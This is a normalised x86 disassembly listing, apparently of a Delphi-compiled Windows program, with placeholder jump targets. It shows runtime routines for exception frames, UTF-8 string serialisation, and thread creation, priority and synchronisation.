push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov cx 0xfde9
mov edx [ ebp - 0x4 ]
call sub_406a80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
inc [ ebp - 0x8 ]
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp - 0x8 ] eax
test bl bl
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov cx 0xfde9
mov edx [ ebp - 0x4 ]
call sub_406a80
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
cmp [ edx + ecx - 0x1 ] 0x7f
jbe r-xdata
cmp [ ebp - 0x8 ] 0xff
jg r-xdata
mov dl 0x14
mov eax esi
call sub_43af10
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax esi
call sub_4389ac
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4389ac
jmp r-xdata
mov dl 0xc
mov eax esi
call sub_43af10
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax esi
call sub_4389ac
mov dl 0x6
mov eax esi
call sub_43af10
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax esi
call sub_4389ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad16
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4389ac
sub_43ad1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_43ae26
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx 0xfde9
call sub_4072d4
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
mov cx 0xfde9
mov edx [ ebp - 0x8 ]
call sub_406a80
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add eax eax
cmp ebx eax
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov dl 0x12
mov eax esi
call sub_43af10
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43abe8
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ae2d
lea eax [ ebp - 0x8 ]
call sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax esi
call sub_4389ac
mov ecx [ ebp - 0xc ]
add ecx ecx
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4389ac
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_43ae34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43aefb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
mov ecx 0xfde9
call sub_4072d4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xff
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov cx 0xfde9
mov edx [ ebp - 0x4 ]
call sub_406a80
lea edx [ ebp - 0x8 ]
mov ecx 0x1
mov eax esi
call sub_4389ac
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x8 ] 0xff
lea eax [ ebp - 0x4 ]
call j_sub_406c24
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4389ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43af02
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
mov cx 0xfde9
mov edx [ ebp - 0x4 ]
call sub_406a80
mov ebx eax
sub_43af24
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_43af94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx rw-data
push 0x0
push ebx
call InterlockedExchange
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4055f0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_43b008
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4305a0
call sub_4055f0
inc esi
dec ebx
jne r-xdata
sub_43b054
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
call sub_43b020
mov eax ebx
call sub_43b02c
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_43b236
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43b217
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b21e
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4305a0
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_430438
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_43b1b9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43b17a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
cmp [ ebx + 0xa ] 0x0
je r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b1c0
push rw-data
call EnterCriticalSection
retn
sub_43b17f
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
call sub_406120
call sub_4042c8
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ edx + 0x14 ] eax
jmp r-xdata
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b1c0
push rw-data
call EnterCriticalSection
retn
sub_43b1c0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4081e0
mov edx 0xc
mov eax [ ebp - 0x8 ]
call sub_404220
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call SetEvent
jmp r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4305a0
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_430438
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_43b1b9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43b17a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
cmp [ ebx + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b21e
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b1c0
push rw-data
call EnterCriticalSection
retn
sub_43b248
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
call sub_40a7e8
mov edx [ ebp - 0x4 ]
mov [ eax + 0x8 ] edx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_43b048
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_43b297
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_406884
mov eax [ ebp - 0x4 ]
call sub_4055f0
sub_43b29c
call sub_4042c8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_43b048
test bl bl
je r-xdata
mov eax esi
call sub_406884
mov eax [ ebp - 0x4 ]
call sub_4055f0
sub_43b2fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_43b3d9
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4055c0
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
xor eax eax
jmp r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov [ esi + 0xe ] al
test bl bl
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov [ esi + 0xc ] al
cmp [ esi + 0x3c ] 0x0
jne r-xdata
mov al 0x1
call GetCurrentThread
mov [ esi + 0x4 ] eax
call GetCurrentThreadId
mov [ esi + 0x8 ] eax
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_43b248
xor edx edx
xor eax eax
call sub_406824
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b3e0
lea eax [ ebp - 0x10 ]
call j_sub_4068a0
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_415718
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
jmp r-xdata
sub_43b400
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_43bdd0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
mov eax [ esi + 0x38 ]
call sub_4055f0
test bl bl
jle r-xdata
cmp [ esi + 0x3c ] 0x0
jne r-xdata
cmp [ esi + 0x3c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
push eax
call CloseHandle
mov eax esi
call sub_43bf5c
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax esi
call sub_43bf80
mov eax esi
call sub_43bf34
sub_43b4b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_43b51e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b525
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_415718
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_43b56c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call GetThreadPriority
mov esi eax
cmp esi 0x7fffffff
setne dl
mov eax ebx
call sub_43b52c
mov al 0x3
xor edx edx
mov ecx rw-data
inc edx
add ecx 0x4
cmp dl 0x7
jne r-xdata
mov eax edx
cmp esi [ ecx ]
jne r-xdata
pop esi
pop ebx
retn
sub_43b5a8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43b646
push [ fs : eax ]
mov [ fs : eax ] esp
or dl [ ebx + 0xc ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0xe ] 0x0
mov [ ebx + 0xc ] 0x0
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
cmp eax 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b64d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
sub_43b654
push ebx
push esi
mov ebx edx
mov esi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_43b52c
pop esi
pop ebx
retn
sub_43b680
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax 0x18
call sub_4081cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b6fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xc ] edx
mov eax [ ebx ]
mov cl 0x1
mov edx [ ebp - 0x4 ]
call sub_43b94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b702
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
retn
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4081e0
sub_43b708
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_409d28
xor eax eax
push ebp
push sub_43b7c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x18
call sub_4081cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43b7a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax 0x10
mov edx [ ebp - 0x4 ]
call sub_409ccc
mov eax [ ebx ]
mov cl 0x1
mov edx [ ebp - 0x8 ]
call sub_43b94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b7af
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
retn
mov edx [ r-xdata ]
mov eax [ ebp - 0x8 ]
call sub_4081e0
sub_43b7d4
push ebp
mov ebp esp
push ecx
test eax eax
je r-xdata
mov edx [ r-xdata ]
mov eax 0x18
call sub_4081cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b865
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xc ] edx
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_43b94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43b680
jmp r-xdata
retn
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4081e0
pop ecx
pop ebp
retn 0x8
sub_43b874
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_43b927
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b92e
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4305a0
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax [ ebx ]
cmp edi [ eax ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_430438
mov eax [ ebx ]
mov edx [ r-xdata ]
call sub_4081e0
mov edx 0xc
mov eax ebx
call sub_404220
mov eax [ ebx ]
mov eax [ eax + 0xc ]
cmp eax [ ebp + 0xc ]
jne r-xdata
sub_43b94c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax 0xc
call sub_404204
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventW
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
jmp r-xdata
movzx ebx [ ebp - 0x5 ]
xor bl 0x1
test bl bl
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4303e0
call sub_43b048
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_43bae9
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_43bac2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x4 ] dl
cmp [ rw-data ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bac9
push rw-data
call LeaveCriticalSection
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_43baa3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_43bac9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call CloseHandle
sub_43bb10
push ebp
mov ebp esp
push ebx
mov ebx eax
mov [ ebx + 0x20 ] ebx
xor eax eax
mov [ ebx + 0x34 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
lea eax [ ebx + 0x30 ]
call sub_409cb4
lea edx [ ebx + 0x20 ]
xor ecx ecx
mov eax [ ebx ]
call sub_43b94c
pop ebx
pop ebp
retn 0x8
sub_43bb44
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_409d28
xor eax eax
push ebp
push sub_43bba1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0x20 ] ebx
xor eax eax
mov [ ebx + 0x34 ] eax
xor eax eax
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] eax
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x4 ]
call sub_409ccc
lea edx [ ebx + 0x20 ]
xor ecx ecx
mov eax [ ebx ]
call sub_43b94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bba8
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_43bbac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_407d18
xor eax eax
push ebp
push sub_43bc2d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea edx [ ebp - 0x18 ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_43b94c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43bb10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bc34
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_407df0
retn
sub_43bc3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_409d28
xor eax eax
push ebp
push sub_43bd11
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ r-xdata ]
mov eax 0x18
call sub_4081cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43bcf4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax 0x10
mov edx [ ebp - 0x4 ]
call sub_409ccc
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_43b94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43b708
jmp r-xdata
retn
mov edx [ r-xdata ]
mov eax [ ebp - 0x8 ]
call sub_4081e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bd18
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_43bd20
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_409d28
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_407d18
xor eax eax
push ebp
push sub_43bdb0
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_409ccc
lea edx [ ebp - 0x20 ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_43b94c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bb44
